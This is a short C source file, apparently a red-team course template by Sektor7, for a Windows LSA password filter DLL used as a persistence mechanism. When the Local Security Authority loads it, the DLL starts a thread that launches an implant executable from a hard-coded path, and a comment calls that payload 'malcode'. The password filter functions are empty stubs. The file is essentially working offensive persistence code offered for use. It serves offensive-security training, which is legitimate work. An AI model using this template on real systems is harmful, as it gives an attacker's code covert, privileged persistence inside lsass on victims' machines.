/*

 Red Team Operator course code template
 LSA Password Filter DLL template
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <WinInet.h>
#include <ntsecapi.h>

int Go(void) {

	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

	CreateProcess(
				"c:\\RTO\\PERS\\implant\\implant.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);

	return 0;
}

BOOLEAN __stdcall InitializeChangeNotify(void) { 

	HANDLE th;
	
	// launch your malcode in a separate thread
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);
	WaitForSingleObject(th, 0);

	return TRUE;
}
NTSTATUS __stdcall PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) { return 0; }
BOOLEAN __stdcall PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation) { return TRUE; }

